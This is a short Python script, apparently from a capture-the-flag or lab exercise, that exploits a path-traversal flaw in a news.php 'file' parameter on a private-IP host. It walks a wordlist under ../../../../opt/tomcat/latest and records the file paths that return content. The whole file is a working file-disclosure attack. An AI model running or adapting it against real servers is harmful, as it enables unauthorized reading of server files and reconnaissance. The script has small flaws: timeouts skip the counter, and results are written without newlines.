import requests
from requests.exceptions import Timeout
from time import sleep

wordlist = [i.strip('\n') for i in open('wordlist.txt').readlines()]
i = 0
prefix = 'http://10.10.10.194/news.php?file=../../../../opt/tomcat/latest'
log = []

for word in wordlist:
    if i % 100 == 0: print(f'{i} out of {len(wordlist)} words done')
    
    try:
        response = requests.get(prefix + word, timeout=5)
    except Timeout:
        print(word, 'timeout')
        sleep(10)
        continue

    if len(response.content) > 0:
        print(word, 'exists')
        log.append(word)
    else:
        print('Nothing at: ' + prefix + word)
    
    i = i + 1

print('Done')
with open('found.txt', 'w') as f:
    f.writelines(log)

